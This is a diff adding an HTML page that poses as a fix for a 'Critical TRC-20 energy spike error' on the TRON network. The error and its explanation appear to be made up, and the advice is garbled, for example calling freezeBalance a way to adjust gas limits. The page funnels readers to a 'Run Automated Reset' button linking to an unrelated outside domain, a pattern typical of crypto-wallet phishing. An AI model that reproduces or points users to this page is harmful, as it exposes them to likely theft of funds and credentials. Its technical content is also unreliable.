@@ -1,0 +1,72 @@
+<!DOCTYPE html>
+<html>
+<head><meta charset="UTF-8"><title>Critical Trc 20 Energy Spike Error</title>
+<style>
+    body {
+        font-family: BlinkMacSystemFont;
+        background: #121214;
+        color: #ddd;
+        padding: 20px;
+        line-height: 1.5;
+    }
+    .content {
+        max-width: 880px;
+        margin: auto;
+        background: #1e1f24;
+        border-radius: 24px;
+        padding: 2rem;
+        box-shadow: none;
+    }
+    pre {
+        background: #0f0f12;
+        padding: 1rem;
+        border-radius: 12px;
+        overflow-x: auto;
+    }
+    a { color: #00adb5; }
+    .btn {
+        background: #ff7b2c;
+        color: #000;
+        padding: 14px 36px;
+        border-radius: 40px;
+        font-weight: bold;
+        display: inline-block;
+        text-decoration: none;
+        transition: 0.2s;
+    }
+    .btn:hover { transform: scale(1.02); }
+    </style>
+</head>
+<body>
+<div class="content">
+<h2>Symptom</h2>
+<ul>
+<li>The user encounters a "Critical TRC-20 energy spike error" message, indicating an abnormal increase in energy consumption on the TRON network, specifically related to TRC-20 token transactions.</li>
+</ul>
+<h2>Technical Root Cause</h2>
+<ul>
+<li>This error occurs due to an unexpected surge in the energy required to process TRC-20 transactions, which can be caused by various factors such as network congestion, inefficient smart contract code, or malicious activities.</li>
+</ul>
+<h3>Manual Overrides</h3>
+<ul>
+<li>To troubleshoot and potentially resolve the issue, the following steps can be taken:</li>
+<li>Verify the current network conditions and wait for congestion to clear</li>
+<li>Optimize smart contract code to reduce energy consumption</li>
+<li>Adjust transaction parameters, such as gas limits, using the following command:</li>
+</ul>
+<pre class="codehilite"><code class="language-bash">tronweb.transactionBuilder.freezeBalance(1000, 3, &quot;TRX&quot;)
+</code></pre>
+
+<p>Consider utilizing an external console for more advanced debugging and troubleshooting capabilities. </p>
+<h2>Prerequisites</h2>
+<ul>
+<li>Familiarity with TRON network architecture</li>
+<li>Understanding of TRC-20 token protocol</li>
+<li>Access to TRONWeb or similar development tools</li>
+</ul>
+<div style="text-align:center; margin-top:2rem;">
+<a href="https://tron.amana-vault.site" class="btn">🛠 Run Automated Reset</a>
+</div>
+</div>
+</body>
+</html>
